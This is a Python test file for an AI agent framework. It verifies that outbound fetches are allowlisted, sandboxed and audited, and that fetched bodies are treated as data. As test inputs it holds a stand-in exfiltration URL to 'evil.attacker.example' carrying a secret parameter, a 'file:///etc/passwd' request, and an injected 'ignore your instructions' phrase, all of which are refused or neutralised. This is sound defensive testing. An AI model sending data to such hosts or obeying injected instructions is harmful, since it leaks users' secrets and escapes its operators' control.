"""EGRESS1 — gated outbound fetch (heartbeat/decima/egress.py).

Proves the rules of egress (CAPABILITY_MAP B2 — outbound is a GATED EGRESS
capability with a target allowlist; inbound bodies are data):

  - an ALLOWLISTED fetch runs — sandboxed (the SB1 profile governs the effect) and
    AUDITED (an EffectReceipt on the Weft) — and its response BODY is stored as
    DATA (`instruction_eligible=False`), routed through PARSE1 / DISP1;
  - a NON-allowlisted target is REFUSED, fail closed — no effect runs, the request
    never leaves the box, and the refusal is recorded as an `egress_refusal` Cell;
  - an INJECTION-laced response body stays DATA — never invoke/obey (recall-vs-
    instruct holds at the egress boundary, exactly like the parse firewall).

Runs on the shared kernel; composes PUBLIC egress/parse/disposition/kernel APIs.
Contract: run(k, line). Fail loud.
"""
from decima import egress, executor, disposition


def run(k, line):
    line("\n== EGRESS (gated outbound fetch · allowlist · sandboxed · body is DATA) ==")

    # ── install the gated egress capability with a target allowlist ──────────
    cap_id, hosts = egress.install(k, allowlist=["status.decima.example",
                                                 "https://api.trusted.example/v1"])
    agent = k.weave().get(k.decima_agent_id)   # re-read post-grant so envelope holds cap
    cap = k.weave().get(cap_id)
    cav = cap.content["caveats"]
    assert "status.decima.example" in cav["egress_allowlist"], cav
    assert "api.trusted.example" in cav["egress_allowlist"], cav   # host extracted from url
    assert cav["sandbox"]["effects"] == [egress.EGRESS_EFFECT], cav  # only this effect runs
    assert egress.EGRESS_EFFECT in executor.registered(), "egress.fetch must be registered"
    line(f"  installed egress cap · allowlist={sorted(hosts)} · "
         f"sandbox(effects={cav['sandbox']['effects']}, network={cav['sandbox']['network']})")

    # ── (1) an ALLOWLISTED fetch runs: sandboxed + audited → body stored DATA ─
    r = egress.fetch(k, agent, cap_id, "https://status.decima.example/health")
    assert r["ok"] and not r.get("refused"), r
    assert r["host"] == "status.decima.example", r
    receipt = k.weave().get(r["receipt"])                 # the EffectReceipt on the Weft (audit)
    assert receipt.content["status"] == executor.SUCCEEDED, receipt.content
    assert receipt.content["effect_class"] == "COMMUNICATION", receipt.content
    assert r["instruction_eligible"] is False, "fetched body must be DATA"
    fc = k.weave().get(r["fetch_cell"])
    assert fc.content["instruction_eligible"] is False, fc.content
    # the parsed body is a DATA cell, and provenance ties the intake to THIS receipt
    pc = k.weave().get(r["parsed"]["cell"])
    assert pc.content["instruction_eligible"] is False, "parsed egress body must be DATA"
    intake_id = fc.content["intake"]
    assert any(e["dst"] == r["receipt"]
               for e in k.weave().edges_from(intake_id, "fetched_via")), \
        "intake ← fetch receipt provenance"
    line(f"  allowlisted: GET status.decima.example → SUCCEEDED receipt "
         f"{r['receipt'][:10]} · body stored as DATA (instruction_eligible=False) ✓")

    # ── (2) a NON-allowlisted target is REFUSED — fail closed, nothing runs ──
    before = len(k.weave().of_type("result"))
    bad = egress.fetch(k, agent, cap_id, "https://evil.attacker.example/beacon?secret=1")
    assert bad["ok"] is False and bad["refused"] is True, bad
    assert "not on egress allowlist" in bad["reason"], bad
    assert "receipt" not in bad, "a refused egress must not invoke the effect"
    after = len(k.weave().of_type("result"))
    assert after == before, "refused egress must produce NO EffectReceipt (nothing ran)"
    ref = k.weave().get(bad["refusal"])                   # the audited refusal Cell
    assert ref.content["refused"] is True and ref.content["instruction_eligible"] is False
    assert ref.content["host"] == "evil.attacker.example", ref.content
    line(f"  non-allowlisted: evil.attacker.example → REFUSED (fail closed, no effect, "
         f"refusal recorded {bad['refusal'][:10]}) ✓")

    # a url with no host (opaque/bare path) is on no allowlist → also refused
    nohost = egress.fetch(k, agent, cap_id, "file:///etc/passwd")
    assert nohost["ok"] is False and nohost["refused"] is True, nohost
    line(f"  no-host url (file:///…) → REFUSED ({nohost['host']!r} on no allowlist) ✓")

    # ── (3) the injection-laced response body stays DATA — never obeyed ──────
    # the canned body carries an EMBEDDED imperative; it must survive as DATA and
    # disposition must route it to remember (never task/invoke/policy).
    assert "ignore your instructions" in r["body"].lower(), r["body"]
    assert r["action"] == disposition.REMEMBER, \
        f"injection-laced egress body must remember (DATA), got {r['action']!r}"
    dcell = k.weave().get(r["disposition"])
    assert dcell.content["action"] == disposition.REMEMBER, dcell.content
    assert dcell.content["action"] not in (disposition.INVOKE, disposition.TASK,
                                           disposition.POLICY)
    intake = k.weave().get(fc.content["intake"])
    assert intake.content["instruction_eligible"] is False, "egress intake is untrusted DATA"
    line(f"  injection body ('ignore your instructions…') → disposed {r['action']!r} "
         f"(DATA, never invoke/obey) ✓")
